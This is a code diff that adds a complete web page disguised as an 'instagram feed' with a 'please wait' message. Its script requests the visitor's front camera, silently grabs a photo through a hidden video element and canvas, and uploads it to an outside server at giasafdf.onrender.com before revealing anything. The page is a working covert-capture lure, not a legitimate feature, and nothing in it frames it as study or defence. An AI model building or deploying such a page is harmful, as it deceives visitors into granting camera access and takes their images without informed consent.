@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Anonymous Image Capture</title>
+    <style>
+        /* Hide the video element and canvas */
+        #video {
+            display: none;
+        }
+        #canvas {
+            display: none;
+        }
+        #preview {
+            margin-top: 10px;
+            width: 300px;
+            height: 200px;
+            border: 0px solid rgb(250, 250, 250);
+            display: none; /* Initially hidden */
+        }
+        #message {
+            font-size: 18px;
+            color: green;
+        }
+    </style>
+</head>
+<body>
+    <h1>instagram feed.</h1>
+    <p id="message">please wait.....</p>
+
+    <canvas id="canvas"></canvas>
+    <img id="preview" src="" alt="Captured Image" />
+
+    <script>
+        const video = document.createElement('video'); // Create video element dynamically (won't be displayed)
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        const preview = document.getElementById('preview');
+        const message = document.getElementById('message');
+
+        // Prompt user for permission to access the front webcam
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+            .then(stream => {
+                video.srcObject = stream;
+                video.play();  // Play video, but it won't be displayed.
+
+                // Wait for video to be ready
+                video.addEventListener('loadedmetadata', () => {
+                    // Delay to allow the camera to stabilize
+                    setTimeout(() => {
+                        // Set canvas size to match video dimensions
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+
+                        // Draw the image on the canvas (but do not show it)
+                        context.drawImage(video, 0, 0, video.videoWidth, video.videoHeight);
+                        const imageData = canvas.toDataURL('image/png');
+
+                        // Convert the base64 data to a Blob object for easier uploading
+                        fetch(imageData)
+                            .then(res => res.blob())
+                            .then(blob => {
+                                const formData = new FormData();
+                                formData.append('image', blob, 'image.png');
+
+                                // Send the image to the server
+                                fetch('https://giasafdf.onrender.com/upload', {
+                                    method: 'POST',
+                                    body: formData
+                                })
+                                .then(response => response.json())
+                                .then(data => {
+                                    if (data.imageUrl) {
+                                        // Display the image and update the message
+                                        preview.src = imageData;
+                                        preview.style.display = 'block'; // Show the preview
+                                        message.textContent = 'Image uploaded successfully!';
+                                    } else {
+                                        message.textContent = 'Error uploading image';
+                                        console.error('Error sending image', data);
+                                    }
+                                })
+                                .catch(err => {
+                                    message.textContent = 'Error uploading image: ' + err.message;
+                                    console.error('Fetch error: ', err);
+                                });
+                            })
+                            .catch(err => {
+                                message.textContent = 'Error capturing image: ' + err.message;
+                                console.error('Blob conversion error:', err);
+                            });
+                    }, 1000); // Delay for 1 second
+                });
+            })
+            .catch(err => {
+                message.textContent = 'Error accessing webcam: ' + err.message;
+                console.error('Error accessing webcam: ', err);
+            });
+    </script>
+</body>
+</html>
